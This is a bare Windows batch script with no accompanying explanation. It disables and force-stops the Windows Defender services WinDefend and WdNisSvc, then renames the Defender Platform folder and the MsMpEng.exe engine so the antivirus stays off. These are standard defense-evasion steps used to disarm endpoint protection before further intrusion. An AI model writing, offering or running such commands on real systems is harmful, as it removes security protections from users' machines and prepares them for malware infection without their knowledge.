Powershell Set-Service -Name WdNisSvc -StartupType Disabled
Powershell Set-Service -Name WinDefend -StartupType Disabled
Powershell Stop-Service -Name WinDefend -Force
Powershell Stop-Service -Name WdNisSvc -Force
cd "C:\ProgramData\Microsoft\Windows Defender"
ren Platform Platform1
cd "C:\Program Files\Windows Defender"
ren MsMpEng.exe MsMpEng1.exe
exit